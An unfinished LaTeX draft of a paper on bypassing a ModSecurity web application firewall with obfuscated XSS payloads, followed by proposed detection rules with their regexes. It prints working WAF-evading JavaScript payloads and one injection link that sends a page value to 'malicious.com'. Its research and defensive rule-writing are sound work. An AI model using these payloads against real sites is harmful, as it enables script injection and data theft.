The last argument given to the Function() constructor is expected to be a string containing the JavaScript statements compromising the function definition. \cite{js/function}

Therefore, the afromentioned substitute for \verb|eval()| - \\ \verb|[].constructor.constructor(`alert('XSS')`)()| - \\ will create a function with the function body \verb|alert('XSS')| and call it directly.
In other words: It will call a function that calls \verb|alert('XSS')|.
Technique by \cite{onecons/wafbypass}.

\subsubsection{square bracket notation}
JavaScript provides a \quotes{square bracket notation} to access properties of an Object. It is used to access multiword properties as well as provide a way of obtaining property names as the result of an expression. \cite{js/brackets}

This \quotes{square bracket notation} allows to substitute the dot notation in a case where using the dot notation is not feasible or blocked by firewall rules.
For instance, in a payload composed using the function constructor as stated in \ref{sec:functionconstructor}, the part \\ \verb|[].constructor.constructor(`alert('XSS')`)()| can be substituted with \\ \verb|[][`constructor`][`constructor`](`alert('XSS')`)()|.


\subsubsection{string replace}
\label{sec:stringreplace}
When passing certain characters is not feasible, there is a chance they can be substituted in a string replacement strategy using the \verb|+| operator.
A part of the description of the \verb|+| operator in JavaScript states:
\begin{quote}
	The + operator is overloaded for two distinct operations: numeric addition and string concatenation. When evaluating, it first coerces both operands to primitives. ... \cite{js/+}
\end{quote}
In the process of primitive coercion, objects are converted to primitives by calling their \verb|[@@toPrimitive]()|, \verb|valueOf()| and \verb|toString()| methods in the given order. Date and Symbol objects are the only built-in objects that override the \verb|[@@toPrimitive]()| method.
Objects without an override for the \verb|[@@toPrimitive]()| method inherit \verb|valueOf| from \verb|Object.prototype.valueOf|, which returns the object itself.
Since the return value is an object, it is ignored and \verb|toString()| is called instead. \cite{js/primitiveCoercion}

In the code \verb|open + []|, \verb|open| is a built-in Function object, \verb|[]| is a built-in Array object.
In the process of primitive coercion, for both, their \verb|toString()| method is being called.
When they are joined by the \verb|+| operator, it results in a String in the form of \verb|open.toString()| concatenated with \verb|[].toString()|. The result is equal to \verb|open.toString()| (see Listing~\ref{lst:opentostring}) as \verb|[].toString()| returns an empty String.

\begin{lstlisting}[style=basicStyle, caption=open.toString() in JavaScript, label={lst:opentostring}]
function open() {
    [native code]
}
\end{lstlisting}

In JavaScript, array-like access to String objects is possible. \cite{js/stringbrackets} For example, \verb|[open+[]][0][13]| returns the character \verb|(|. \verb|[open+[]][0][14]| returns the character \verb|)|. Listing~\ref{lst:opentostringindices} visualizes open.toString() with the corresponding indices.

\begin{lstlisting}[style=basicStyle, caption=open.toString() with indices in JavaScript, label={lst:opentostringindices}]
f u n c t i o n   o p  e  n  (  )     {  \n       
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 

[  n  a  t  i  v  e     c  o  d  e  ]  \n }  
22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 
\end{lstlisting}


\subsubsection{Aurebesh}






	\section{Evaluation Results}
\label{sec:EvaluationResults}
Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
\begin{lstlisting}[style=basicStyle]
	<a href=j&#97v&#97script&#x3A;
	var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
	var&#32data&#32=&#32&#123body:secret,method:'POST'\};
	fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
\end{lstlisting}

\begin{itemize}
	\item Using function constructor to evade eval() detection
	\item supplying the argument via tagged template literal to avoid () characters
	\item the 'a' in front of the template in the template string to avoid an error that is thrown if the first parameter in a multi parameter call to the function constructor is not a valid javascript parameter
	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
\end{itemize}

theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection

\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}


tried to encode the  payload:
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}
with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO

weird unicode: tried using 
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

	but result is 
{\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}
\end{lstlisting}


unicode tests:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:unicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>

<payload>encodeURIComponent('`\u0024{`alert`}')</payload>
<payload>"%60%24%7B%60alert%60%7D"</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}



	\subsection{Interpretation of evaluation results}
Evaluation results show that there are multiple Firewall Evasion techniques effective against the tested firewall configuration. {\color{red}X of Y} tested Firewall Evasion techniques have proven effective during the evaluation. Using the techniques described in Section~\ref{sec:unicodenormalization}: Unicode Normalization, Section~\ref{sec:taggedtemplateliterals}: Tagged Template Literals, Section~\ref{sec:functionconstructor}: Function constructor in combination with Section~\ref{sec:sbn}, Section~\ref{sec:stringreplace} and Section~\ref{sec:aurebesh}, multiple payloads can be constructed to bypass the tested firewall configuration. Section~\ref{sec:multiiteration} states examples including passing malicious html elements (Section~\ref{sec:htmlencjsesc}) as well as directly executable JavaScript code (Section~\ref{sec:funconstrconbypass}. 
Further possible payloads include payloads that could be used to circumvent a more stringent ruleset.
Section~\ref{sec:avoidingbypassA} states a proof of concept of a valid payload that avoids passing the characters \verb|()| as part of the payload.
Similarly, Section~\ref{sec:avoidingbypassB} states a proof of concept of a valid payload that avoids passing the characters \verb|{}| as part of the payload. 

While the evaluation results state some possible evading payloads as is, it seems natural that there are more evading payloads possible using a combination of the stated techniques under Section~\ref{sec:firewallevasiontechniques}.

Using these results, the administrator of the tested firewall can implement new filtering rules. Depending on the implementation context of the firewall, such as the language used to configure the firewall rules, some limitations might apply. Using the ModSecurity firewall configured to use the CoreRuleSet as an example, the firewall rules can be extended following the guide provided in their documentation. By extending the ruleset, it is possible to blacklist the bypassing payloads. Created and proposed rules based on the evaluation results mentioned under Section~\ref{sec:singleiterationeva} and Section~\ref{sec:multiiteration} are detailed under Section~\ref{sec:rulesproposal}. Depending on the specific Web Application that is protected by the Web Application firewall, adding rules that completely block some Evasion Techniques that were detected to be effective might be possible. If that is not the case, it could be possible to blacklist payloads that were discovered during the evaluation. At least, some discovered bypassing payloads are known after the evaluation. With this knowledge, the Web Application can be fortified using a different methodology to adding firewall filtering rules. If nothing is to be done about the findings, still the knowledge gained about bypassing payloads can be used to estimate the risk posed to the Web Application. 

Gathered evaluation results can be used to gain knowledge about payload limitations that incur by applying Firewall Evasion techniques to a payload. (Using this knowledge, more defensive measures based on exploiting the incurred payload limitations can theoretically be deployed to render a specific evasion technique useless.)
Incurring payload limitations will be discussed in the following section.



... 

	\subsection{Rules Proposal}
\label{sec:rulesproposal}
During the evaluation of the tested firewall configuration, some firewall evading payloads were found. For some of those bypasses, new rule configurations will be proposed. As mentioned before, adding new filtering rules always poses a risk that subsequently, benign requests might be flagged as malicious. As such, the possible implications of adding new firewall rules needs to be considered.

	{\color{red} TODO: explain modsecurity/coreruleset rule setup?}

\subsubsection{Function Constructor: Results}
\label{sec:rulespropfunctionconstructor}
The bypassing payload from sections Section~\ref{sec:funconstrconbypass}: Function Constructor + String Concatenation, Section~\ref{sec:avoidingbypassA}: Avoiding () and Section~\ref{sec:avoidingbypassB}: Avoiding \{\} rely on accessing the function constructor by accessing functions on built-in objects.

To block requests using the function contructor (dot notation) as a method to evade the current evaluated firewall configuration, a new firewall rule (Listing~\ref{lst:constuctorsruleproposal}) is proposed:

\begin{lstlisting}[style=basicStyle, caption=rule proposal to block usage of function constructor via dot notation, label={lst:constructorsruleproposal}]
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx (?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\.[a-z]*\.constructor[`,(,\[]" \
    "id:2,\
    phase:2,\
    auditlog,\
    capture,\
    t:none,t:urlDecodeUni,t:compressWhitespace,\
    msg:'XSS JavaScript function with constructor',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'attack-xss',\
    tag:'xss-perf-disable',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL',\
    setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
\end{lstlisting}

The rule with \verb|id:2| shown in Listing~\ref{lst:constructorsruleproposal} aims at matching usage of the function constructor via dot notation using the following regular expression:

\begin{lstlisting}[style=basicStyle, caption=regex of proposed rule id:2, label={lst:constructorsruleproposalregexA}]
(?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\.[a-z]*\.constructor[`,(,\[]

explanation:
(?i)  match the remainder of the pattern with the i modifier: Case insensitive match

(?:   start a non-capturing group (object group)

(?:   start a non-capturing group (square bracket group)
\[    match on a single opening square bracket
[     start a list
^\]   exclude the closing square bracket from matching
]     end the list
*     match the characters from the list (anything that is not a square closing bracket) between 0 and unlimited times
\]    match on a single closing square bracket
)     close the group (square bracket group)

|     give an alternative the previous group (square bracket group)

(?:	  start a non-capturing group (curly bracket group)
\{	  match on a single opening curly bracket
[     start a list
^}	  exclude the closing curly bracket
]     end the list
*     match the characters from the list (anything that is not a curly closing bracket) between 0 and unlimited times
\}	  match on a single closing curly bracket
)     close the group (curly bracket group)

)     close the group (object group)

\.    match on a single dot

[     start a list
a-z   match a single character between a (index 97) and z (index 122)
]     end the list
*     match the characters from the list (anything from a to z) between 0 and unlimited times

\.	  match on a single dot

constructor    match on the word "constructor"

[     start a list
`,(,\[         match on a single `, opening round bracket or opening square bracket
]     end the list
\end{lstlisting}

The two payload options of: \\
\verb|[].something.constructor()| and \verb|{}.something.constructor()| \\
are matched by this regular expression. Therefore, once the configuration is updated with the proposed rule, the bypassing payload using dot notation that has been discovered in Section~\ref{sec:funconstrconbypass} is being detected by the evaluated firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor bypass payload using dot notation blocked, label={lst:constructorsblockedpoc}]
<payload>[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor("</MatchedData>
\end{lstlisting}

Equally, the bypassing payloads using dot notation that have been discovered in Section~\ref{sec:avoidingbypassA} and  Section~\ref{sec:avoidingbypassB} are now being detected by the evaluated firewall. Section~\ref{sec:avoidingbypassA}: Avoiding () bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () bypass payload using dot notation blocked, label={lst:constructorsblockedpoc}]
<payload>[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor`"</MatchedData>
\end{lstlisting}

Section~\ref{sec:avoidingbypassB}: Avoiding {} bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=using constructors rule poc, label={lst:constructorsblockedpoc}]
<payload>[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[].constructor.constructor("</MatchedData>
\end{lstlisting}

The proposed firewall rule manages to block a part the mentioned bypassing payloads. The sections Section~\ref{sec:funconstrconbypass}, Section~\ref{sec:avoidingbypassA} and Section~\ref{sec:avoidingbypassB} further state similar payloads created using the square bracket notation. These are not detected and filtered by the proposed rule with \verb|id:2|.

To block requests using the function contructor via square bracket notation, another firewall rule \verb|id:3| is proposed:

\begin{lstlisting}[style=basicStyle, caption=rule proposal to block usage of function constructor via square bracket notation, label={lst:constructorsruleproposalB}]
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx (?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\[[`,',\"][a-z]*[`,',\"]\]\[[`,',\"]constructor[`,',\"]\][`,(,\[]" \
    "id:3,\
    phase:2,\
    auditlog,\
    capture,\
    t:none,t:urlDecodeUni,t:compressWhitespace,\
    msg:'XSS JavaScript function with constructor (square bracket notation)',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'attack-xss',\
    tag:'xss-perf-disable',\
    tag:'paranoia-level/1',\
    severity:'CRITICAL', \
    setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
\end{lstlisting}

The rule with \verb|id:3| shown in Listing~\ref{lst:constructorsruleproposal} aims at matching usage of the function constructor via square bracket notation using the following regular expression:

\begin{lstlisting}[style=basicStyle, caption=regex of proposed rule id:2, label={lst:constructorsruleproposalregexB}]
(?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))\[[`,',"][a-z]*[`,',"]\]\[[`,',"]constructor[`,',"]\][`,(,\[]

explanation:
(?i)(?:(?:\[[^\]]*\])|(?:\{[^}]*\}))    equal to the previous regular expression used in proposed rule with id:2

\[    match a single opening square bracket
[     start a list
`,'," match ticks indicating a string
]     end the list
[     start a list
a-z   match a single character between a (index 97) and z (index 122)
]     end the list
*     match the characters from the list (anything from a to z) between 0 and unlimited times
[     start a list
`,'," match ticks indicating a string
]     end the list
\]    match a single closing square bracket

\[    match a single opening square bracket
[     start a list
`,'," match ticks indicating a string
]     end the list
constructor     match on the word "constructor"
[     start a list
`,'," match ticks indicating a string
]     end the list
\]    match a single closing square bracket

[     start a list
`,(,\[         match on a single `, opening round bracket or opening square bracket
]     end the list
\end{lstlisting}

The two payload options of: \\
\verb|[]['something']['constructor']()| and \verb|{}['something']['constructor']()| \\
are matched by this regular expression. Therefore, once the configuration is updated with the proposed rule, the bypassing payload using square bracket notation that has been discovered in Section~\ref{sec:funconstrconbypass} is being detected by the evaluated firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor bypass payload using square bracket notation blocked, label={lst:constructorsblockedsbn}]
<payload>[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()</payload>
<message>"XSS JavaScript function with constructor (square bracket notation)"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "30"] [id "3"]<fileDetails>
<MatchedData>"[]['constructor']['constructor']("</MatchedData>
\end{lstlisting}

Equally, the bypassing payloads using square bracket notation that have been discovered in Section~\ref{sec:avoidingbypassA} and  Section~\ref{sec:avoidingbypassB} are now being detected by the evaluated firewall. Section~\ref{sec:avoidingbypassA}: Avoiding () bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () bypass payload using square bracket notation blocked, label={lst:constructorsblockedsbnA}]
<payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[]['constructor']['constructor']`"</MatchedData>
\end{lstlisting}

Section~\ref{sec:avoidingbypassB}: Avoiding {} bypass:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding {} bypass payload using square bracket notation blocked, label={lst:constructorsblockedsbnB}]
<payload>[]['constructor']['constructor']('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();</payload>
<message>"XSS JavaScript function with constructor"</message>
<file>"/rules/REQUEST-000-XSS-PROPOSAL.conf"</file>
<fileDetails>[line "13"] [id "2"]<fileDetails>
<MatchedData>"[]['constructor']['constructor']("</MatchedData>
\end{lstlisting}

The proposed firewall rule manages to block the second part the mentioned bypassing payloads. Using proposed rules \verb|id:2| and \verb|id:3|, all discovered payloads in sections Section~\ref{sec:funconstrconbypass}, Section~\ref{sec:avoidingbypassA} and Section~\ref{sec:avoidingbypassB} are successfully blocked.



\subsubsection{Function Constructor: Reflection}
The rules implemented in the previous section (Section~\ref{sec:rulespropfunctionconstructor}: Function Constructor: Results) have been reflected upon the used evasion technique stated in Section~\ref{sec:functionconstructor}: Function Constructor.

While accessing the function constructor as it is done in the mentioned bypassing payloads is no longer possible with the proposed rules \verb|id:2| and \verb|id:3| from Section~\ref{sec:rulespropfunctionconstructor}, the practice of creating firewall evading payloads through accessing the function constructor by accessing the constructor of JavaScripts built-in objects will still yield successful results. Not all vectors opened by this technique are covered by the proposed rules. Creating an Array object by calling \verb|new Array()| is equivalent to calling \verb|[]| in terms of creating a malicious payload that accesses the function constructor. Section~\ref{sec:functionconstructor} states more options to access the function constructor via other built-in objects in JavaScript at the time of this writing.

Coverage could be achieved by removing the first part of the regular expression mentioned under Listing~\ref{lst:constructorsruleproposalregexA}, such that only the following remains:

\begin{lstlisting}[style=basicStyle, caption=reduced regex of proposed rule id:2, label={lst:constructorsruleproposalregexB}]
(?i)\.[a-z]*\.constructor[`,(,\[]
\end{lstlisting}

The reduced regular expression matches on any payload that includes \verb|.constructor| followed by one of the characters \verb|`([|. This rule matches on the payload

\begin{lstlisting}[style=basicStyle]
[].constructor.constructor()
\end{lstlisting}

as well as the payload

\begin{lstlisting}[style=basicStyle]
new Array().constructor.constructor()
\end{lstlisting}

as would it flag the following benign payload that contains an example blog post as malicious
\begin{lstlisting}[style=basicStyle]
Objects in JavaScript are often created using
a.constructor.constructor(s)
can be used to initialize instances with variable properties.
\end{lstlisting}
Using this reduced regular expression can be considered too general to be used in certain environments. A more fine grained regular expression covering more options of accessing the function constructor will therefore be part of the proposed rule in the further course of this section.

Deciding between using the full regular expression stated in Listing~\ref{lst:constructorsruleproposalregexA} and its reduced variant forces the decision between the increased risk of allowing certain malicious payloads to bypass the firewall or the increased risk of false positives. It points to the required balancing act between the two risks.

In the context of this work, it was decided suitable to balance the mentioned risks by implementing a rule that would detect usage of all built-in objects and classes mentioned under Section~\ref{sec:functionconstructor}. This rule is based on the afromentioned evasion technique and relevant evaluation under Section~\ref{sec:functionconstructorsingleeva}. 

	{\color{blue}kurzer test hat ergeben: das geht auch: Proxy.constructor.constructor('al' + 'ert("Proxy")')(); }



The proposed rule ensures the coverage of known evasion techniques, decreases the risk of false positives compared to the reduced regular expression mentioned under Listing~\ref{lst:constructorsruleproposalregexB} but simultaneously increases the risk of missed built-in objects compared to the reduced regular expression mentioned under Listing~\ref{lst:constructorsruleproposalregexB}. For instance, once new built-in objects are introduced into the JavaScript language, the proposed rule needs to be updated while usage of the reduced regular expression (Listing~\ref{lst:constructorsruleproposalregexB}) would match on any character sequence without depending on knowledge about built-in object naming.  




	{\color{red}Ideen bisher:}

Unicode Normalization: ModSec WAF uses transformers to decode URL encoded payloads before they are checked against the ruleset, they same could be done with unicode normalization. normalize according to NFKC and then check the request against the ruleset

Regex to detect and block \verb|["something(any array or object function)"]["constructor"]|

Regex to detect and block \verb|["something(any array or object function)"].constructor|






{\color{red} TODO: mehr in form von: Considering evaluation result [ref], it a rule in the form of [listing] could potentially avoid a bypass using the technique [ref]}


	\section{Generic Evaluation Proposal}
When experimenting with firewall evasion techniques, an iterative approach to developing them seems a good solution. Example: supplying link with javascript:[code] (first with alert and then a script that fetches some stuff, see listing)
{\color{red}TODO}

	\section{Conclusion}
\label{sec:conclusion}
{\color{red}TODO
Firewall evasion is a tricky topic. A lot of influencing factors: Firewall, Configuration, Payload (Language, Type, Input Options), Blackbox or Whitebox. 

Hier nochmal zusammenfassung der ergebnisse und rotem faden
}



{\color{red} TODO}

Possible improvements and further research into the evaluation approach shown in the context of this work are discussed in the following section, Section~\ref{sec:continuations}: Continuations. 



	% Quellenverzeichnis
	\newpage
	\printbibliography
	
\end{document}
